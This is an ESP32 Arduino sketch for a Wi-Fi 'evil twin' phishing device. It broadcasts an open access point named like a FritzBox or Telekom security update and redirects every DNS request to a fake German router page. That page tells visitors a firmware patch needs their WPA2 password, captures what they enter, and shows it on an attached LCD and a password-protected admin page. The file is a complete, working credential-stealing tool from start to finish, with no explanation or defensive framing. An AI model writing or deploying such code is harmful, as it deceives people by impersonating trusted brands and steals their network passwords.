#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7789.h>

#define LCD_CS   15
#define LCD_DC     2
#define LCD_RST    4
#define LCD_BLK   32

Adafruit_ST7789 lcd = Adafruit_ST7789(LCD_CS, LCD_DC, LCD_RST);
WebServer server(80);
DNSServer dnsServer;

String ssidName = "FritzBox_Sicherheits-Update"; // Oder "Telekom_Service_Highspeed"
String erbeutetesPW = "Warte auf Login...";
const char* adminUser = "admin";
const char* adminPass = "pentest2026";

void setup() {
  pinMode(LCD_BLK, OUTPUT);
  digitalWrite(LCD_BLK, HIGH);
  lcd.init(170, 320);
  lcd.setRotation(1);
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssidName.c_str());
  dnsServer.start(53, "*", WiFi.softAPIP());

  setupServer();
  updateDisplay();
}

// Hochwertiges Router-UI Design
String getRouterHTML() {
  String s = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>";
  s += "<style>body{font-family:Arial,sans-serif;background:#eee;margin:0;padding:0;}";
  s += ".header{background:#00549f;color:white;padding:15px;text-align:center;font-weight:bold;font-size:1.2em;}";
  s += ".container{padding:20px;max-width:400px;margin:auto;}";
  s += ".card{background:white;padding:25px;border-radius:4px;box-shadow:0 2px 5px rgba(0,0,0,0.2);}";
  s += "h3{color:#333;margin-top:0;} p{font-size:14px;color:#666;line-height:1.4;}";
  s += "input{width:100%;padding:12px;margin:15px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;font-size:16px;}";
  s += "button{width:100%;padding:12px;background:#ff8c00;color:white;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer;}";
  s += ".footer{text-align:center;font-size:11px;color:#999;margin-top:20px;}</style></head>";
  s += "<body><div class='header'>Router Management Konsole</div>";
  s += "<div class='container'><div class='card'><h3>Firmware-Update erforderlich</h3>";
  s += "<p>Zur Installation des Sicherheits-Patches KB-2026-X86 verifizieren Sie bitte den aktuellen WPA2-Schlüssel Ihres WLAN-Netzwerkes.</p>";
  s += "<form action='/capture' method='POST'>";
  s += "<input type='password' name='wifipw' placeholder='WLAN-Passwort (WPA2)' minlength='8' required>";
  s += "<button type='submit'>Update starten</button></form></div>";
  s += "<div class='footer'>&copy; 2026 Router-Sicherheitssysteme AG</div></div></body></html>";
  return s;
}

void setupServer() {
  server.on("/", []() { server.send(200, "text/html", getRouterHTML()); });

  server.on("/capture", HTTP_POST, []() {
    if (server.hasArg("wifipw")) {
      erbeutetesPW = server.arg("wifipw");
      updateDisplay();
      server.send(200, "text/html", "<html><body style='text-align:center;font-family:sans-serif;padding-top:50px;'><h2>Update wird verarbeitet...</h2><p>Bitte das Fenster nicht schliessen. Der Router startet in ca. 5 Minuten neu.</p></body></html>");
    }
  });

  server.on("/admin", []() {
    if (!server.authenticate(adminUser, adminPass)) return server.requestAuthentication();
    server.send(200, "text/html", "<h1>Gefangene Daten: " + erbeutetesPW + "</h1>");
  });

  server.onNotFound([]() { server.send(200, "text/html", getRouterHTML()); });
  server.begin();
}

void updateDisplay() {
  lcd.fillScreen(ST77XX_BLACK);
  
  // Header
  lcd.fillRect(0, 0, 320, 40, 0x001F); // Dunkelblau
  lcd.setCursor(10, 10);
  lcd.setTextColor(ST77XX_WHITE);
  lcd.setTextSize(2);
  lcd.println("WIFI LOOKI LOOKI");

  // Infos
  lcd.setCursor(10, 60);
  lcd.setTextSize(2);
  lcd.setTextColor(ST77XX_CYAN);
  lcd.print("SSID: "); 
  lcd.setTextColor(ST77XX_WHITE);
  lcd.println(ssidName);

  lcd.setCursor(10, 100);
  lcd.setTextColor(ST77XX_YELLOW);
  lcd.println("GEFUNDENES PASSWORT:");
  
  // Das Passwort groß anzeigen
  lcd.drawRect(5, 125, 310, 40, ST77XX_GREEN);
  lcd.setCursor(15, 135);
  lcd.setTextColor(ST77XX_GREEN);
  lcd.setTextSize(2);
  lcd.println(erbeutetesPW);
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
